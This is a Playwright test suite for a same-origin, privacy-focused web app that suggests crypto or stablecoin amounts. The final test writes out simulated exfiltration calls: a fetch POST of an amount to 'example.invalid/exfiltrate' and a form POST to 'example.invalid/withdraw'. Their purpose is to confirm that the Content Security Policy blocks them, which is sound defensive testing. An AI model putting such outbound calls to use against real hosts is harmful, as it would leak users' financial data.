import { test, expect } from '@playwright/test';
import { allowedOrigin, audit, deterministic, isApproved, probePolicy, submit } from './harness.mjs';

const SUGGESTION = '44';

test('a whole visit stays same-origin: first load, both themes, both languages, both assets, submission and the IPFS path', async ({ browser }) => {
  const context = await browser.newContext();
  try {
    await probePolicy(context);
    const page = await context.newPage();
    const log = audit(page);
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    await expect(page.locator('#input-title')).toBeVisible();

    // Two themes, both languages, both assets (the engine's two asset classes), an actual submission each.
    for (const theme of ['playful', 'zen']) {
      if (theme === 'zen') await page.locator('#theme').click();
      for (const language of ['en', 'zh']) {
        if (language === 'zh') await page.locator('#language').click();
        for (const [asset, minimum, maximum] of [['USD-stable', '43.21', '60'], ['ETH', '0.0011', '0.003']]) {
          await page.locator('#asset').selectOption(asset);
          await submit(page, minimum, maximum);
          await expect(page.locator('#error')).toBeEmpty();
          await expect(page.locator('#value')).not.toHaveText('—');
        }
      }
    }
    // Path-gateway mount, the deployment shape that ships to IPFS.
    await page.goto('/ipfs/test-cid/');
    await page.waitForLoadState('networkidle');
    await expect(page.locator('#input-title')).toBeVisible();
    await submit(page, '43.21', '60');
    await expect(page.locator('#value')).not.toHaveText('—');

    expect(await page.evaluate(() => [...document.images].every(image => image.complete && image.naturalWidth > 0))).toBe(true);
    await log.assertClean('full visit');
    expect(log.requests.length).toBeGreaterThan(5);
    expect(log.requests.every(isApproved)).toBe(true);
  } finally {
    await context.close();
  }
});

test('@webkit the first response is styled by same-origin CSS with no font download', async ({ browser }) => {
  const context = await browser.newContext();
  try {
    await probePolicy(context);
    const page = await context.newPage();
    const log = audit(page);
    const responses = [];
    page.on('response', response => responses.push({ url: response.url(), type: response.request().resourceType() }));
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    const fonts = responses.filter(entry => entry.type === 'font');
    expect(fonts).toEqual([]);
    // Every stylesheet must come from the audited origin, whatever its versioned URL.
    const stylesheets = responses.filter(entry => entry.type === 'stylesheet');
    expect(stylesheets.length).toBeGreaterThan(0);
    for (const stylesheet of stylesheets) expect(isApproved(stylesheet.url)).toBe(true);
    await log.assertClean('first response');
  } finally {
    await context.close();
  }
});

test('@webkit submitting amounts adds no request and stores no amount anywhere in the browser', async ({ browser }) => {
  const context = await browser.newContext();
  try {
    await probePolicy(context);
    await deterministic(context);
    const page = await context.newPage();
    const log = audit(page);
    await page.goto('/');
    await page.waitForLoadState('networkidle');
    const baseline = log.requests.length;
    await submit(page, '43.21', '60');
    await expect(page.locator('#value')).toHaveText(SUGGESTION);
    await page.locator('#minimum').fill('44.21');
    await page.locator('#recommend').click();
    await page.locator('#copy-amount').click();
    // Submitting, re-submitting and copying are purely local.
    expect(log.requests.slice(baseline), 'submitting or copying must not fetch anything').toEqual([]);
    // Switching theme may lazily load a same-origin CSS background; that is still local to the site.
    await page.locator('#theme').click();
    await page.locator('#language').click();
    expect(log.requests.slice(baseline).every(isApproved)).toBe(true);

    const state = await page.evaluate(async () => {
      const dump = storage => Object.fromEntries(Object.entries(storage).map(([key, value]) => [key, String(value)]).filter(([key]) => !key.startsWith('__')));
      const cookies = document.cookie;
      let databases = null;
      if (indexedDB.databases) databases = (await indexedDB.databases()).map(database => database.name ?? '');
      return {
        local: dump(localStorage),
        session: dump(sessionStorage),
        cookies,
        databases,
        analytics: ['dataLayer', 'gtag', 'fbq', '_paq', 'mixpanel', 'plausible', 'umami'].filter(name => name in window),
      };
    });
    // Theme/language preferences may be persisted; amounts and analytics never may.
    for (const [scope, entries] of [['localStorage', state.local], ['sessionStorage', state.session]]) {
      for (const [key, value] of Object.entries(entries)) {
        expect(key, `${scope} key`).toMatch(/^(theme|language|lang|mode|pref)/i);
        for (const amount of [SUGGESTION, '44.21', '60', '43.21']) {
          expect(value, `${scope}.${key}`).not.toContain(amount);
        }
      }
    }
    for (const amount of [SUGGESTION, '44.21', '60', '43.21']) expect(state.cookies).not.toContain(amount);
    expect(state.cookies).not.toMatch(/_ga|_gid|fbp|ajs_/i);
    expect(state.databases ?? []).toEqual([]);
    expect(state.analytics).toEqual([]);
    await log.assertClean('submission');
  } finally {
    await context.close();
  }
});

test.describe('policy enforcement (isolated from the zero-violation audit)', () => {
  test('@webkit the shipped policy blocks outbound connections and form posts', async ({ browser }) => {
    const context = await browser.newContext();
    try {
      await probePolicy(context);
      const page = await context.newPage();
      const attempted = [];
      page.on('request', request => attempted.push(request.url()));
      await page.goto('/');
      await page.waitForLoadState('networkidle');
      const before = attempted.length;

      const blocked = await page.evaluate(async () => {
        try {
          await fetch('https://example.invalid/exfiltrate', { method: 'POST', body: 'amount=43.21' });
          return 'allowed';
        } catch (error) {
          return `blocked:${error.name}`;
        }
      });
      expect(blocked).toBe('blocked:TypeError');
      const violations = await page.evaluate(() => window.__cspViolations);
      expect(violations.some(violation => violation.directive === 'connect-src')).toBe(true);
      expect(attempted.slice(before).filter(url => url.includes('example.invalid'))).toEqual([]);

      const navigation = await page.evaluate(() => {
        window.__submitted = false;
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://example.invalid/withdraw';
        const field = document.createElement('input');
        field.name = 'amount';
        field.value = '43.21';
        form.append(field);
        document.body.append(form);
        form.requestSubmit();
        return true;
      });
      expect(navigation).toBe(true);
      await page.waitForTimeout(300);
      const afterForm = await page.evaluate(() => window.__cspViolations);
      expect(afterForm.some(violation => violation.directive === 'form-action')).toBe(true);
      expect(page.url()).toBe(`${allowedOrigin}/`);
      expect(attempted.slice(before).filter(url => url.includes('example.invalid'))).toEqual([]);
    } finally {
      await context.close();
    }
  });
});
